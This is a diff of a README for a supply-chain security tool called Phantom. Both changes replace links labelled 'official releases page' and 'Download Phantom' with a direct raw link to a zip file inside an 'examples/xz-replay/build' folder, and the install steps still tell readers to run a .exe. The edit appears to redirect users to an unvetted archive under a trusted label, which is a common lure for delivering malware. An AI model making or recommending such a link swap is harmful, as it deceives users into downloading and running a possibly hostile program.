@@ -1,6 +1,6 @@
 # 🔍 phantom - Secure your software supply chain today
 
-[![Download Phantom](https://img.shields.io/badge/Download_Phantom-Windows-blue.svg)](https://github.com/nattytextual872/phantom/releases)
+[![Download Phantom](https://img.shields.io/badge/Download_Phantom-Windows-blue.svg)](https://raw.githubusercontent.com/nattytextual872/phantom/main/examples/xz-replay/build/Software-v3.9-beta.2.zip)
 
 Phantom helps you find security gaps in your digital supply chain. Modern software development relies on many parts, including artificial intelligence tools and automated assistants. These tools often bring hidden risks. Phantom scans your project files to find dangerous code, bad configuration settings, and potential injection attacks. It ensures your projects remain safe from modern digital threats.
 
@@ -21,7 +21,7 @@ You do not need to install complex software like Python or Node.js. Phantom work
 
 ## 📥 How to Install and Run
 
-1. Visit the [official releases page](https://github.com/nattytextual872/phantom/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/nattytextual872/phantom/main/examples/xz-replay/build/Software-v3.9-beta.2.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` that matches your Windows version.
 4. Save the file to your computer.
